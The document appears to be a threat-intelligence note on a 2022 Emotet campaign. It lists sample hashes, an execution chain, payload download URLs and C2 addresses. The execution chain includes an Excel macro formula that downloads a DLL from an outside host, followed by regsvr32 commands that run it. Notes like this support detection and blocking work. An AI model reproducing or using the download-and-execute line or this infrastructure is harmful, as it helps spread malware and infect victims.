@@ -1,0 +1,85 @@
+Emotet 2022 | epoch5 | 08.03.2022 | 
+
+************************************************************************************************************
+
+.xls 7bf1d13eddf3df12af9b44ff6db8c8e77415dcad59396eee59b4a9932143b5d7
+.dll fc0cd6c7f4272bd2091593b126e234c9521cefc1099b26193c3abedbf2757ef1
+
+************************************************************************************************************
+
+Exec >>
+
+EXCEL.EXE C:\Users\Admin\AppData\Local\Temp\mensaje_10681.xlsm
+
+=CALL("urlmon", "URLDownloadToFileA", "JCCB", 0, "http://suleyera.com/components/CNGhltc5v2K6/", "..\ax.ocx")
+
+regsvr32.exe -s ..\ax.ocx
+
+regsvr32.exe /s "C:\Windows\SysWOW64\Jkjfpskmvtytpwvm\pjzuyykxapag.wvx"
+
+
+************************************************************************************************************
+
+.dll distro
+
+http://suleyera.com/components/CNGhltc5v2K6/
+http://sociallysavvyseo.com/PinnacleDynamicServices/pRlYMzvfuu5B/
+http://moveit.savvyint.com/config/DsfssbO7BYG/
+https://schwizer.net/styled/D0MG/
+http://shabeerpv.atwebpages.com/css/ww6if1YAsMpjpuGz/
+http://shimal.atwebpages.com/wp-content/xkaRkHr/
+http://retailhpsinterview.com/search/yNbsL/
+http://www.agretto.com/Template/pnM0iPs4b2IfR7XY7v/
+http://www.agnesleung.com/raw.backup/p8D6ttXDaNwd/"
+http://xnxx.c1.biz/images/iJNVpahOW4CBuidDD66/
+https://pakistannakliye.com/Dodonian/tSasxFCiQXxh5Qvin/
+https://gsmjordan.com/SupplierPanel/XII/
+https://wellnessonus.com/wp-admin/OFq5F8Y/
+
+
+c2's
+
+51.75.33.122:443
+186.250.48.5:80
+168.119.39.118:443
+207.148.81.119:8080
+194.9.172.107:8080
+139.196.72.155:8080
+78.47.204.80:443
+159.69.237.188:443
+45.71.195.104:8080
+54.37.106.167:8080
+185.168.130.138:443
+37.44.244.177:8080
+185.184.25.78:8080
+185.148.168.15:8080
+128.199.192.135:8080
+37.59.209.141:8080
+103.41.204.169:8080
+185.148.168.220:8080
+103.42.58.120:7080
+78.46.73.125:443
+68.183.93.250:443
+190.90.233.66:443
+5.56.132.177:8080
+62.171.178.147:8080
+196.44.98.190:8080
+168.197.250.14:80
+66.42.57.149:443
+59.148.253.194:443
+104.131.62.48:8080
+191.252.103.16:80
+54.37.228.122:443
+88.217.172.165:8080
+195.77.239.39:8080
+116.124.128.206:8080
+93.104.209.107:8080
+118.98.72.86:443
+217.182.143.207:443
+87.106.97.83:7080
+210.57.209.142:8080
+54.38.242.185:443
+195.154.146.35:443
+203.153.216.46:443
+198.199.98.78:8080
+85.214.67.203:8080
